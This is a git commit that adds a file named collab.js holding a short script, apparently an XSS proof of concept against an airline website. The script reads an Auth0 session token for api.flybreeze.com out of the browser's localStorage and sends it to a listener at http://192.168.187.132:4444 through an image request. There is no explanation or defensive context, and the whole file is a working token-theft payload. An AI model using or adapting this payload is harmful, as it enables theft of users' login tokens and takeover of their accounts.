346f30f06133faa8acf96b0d92294ed6898781d8
George Devasia <56887176+georgedevasia0@users.noreply.github.com>
2023-11-05 03:32:28 +0530

    Add files via upload

---
+++ collab.js
@@ -0,0 +1,4 @@
+<script>
+var x = localStorage.getItem("@@auth0spajs@@::CO52GBRxMb4tw6U3EsBk5dW0hb1U0yrn::https://api.flybreeze.com::openid profile email offline_access");
+new Image().src="http://192.168.187.132:4444?output="+x;
+</script>
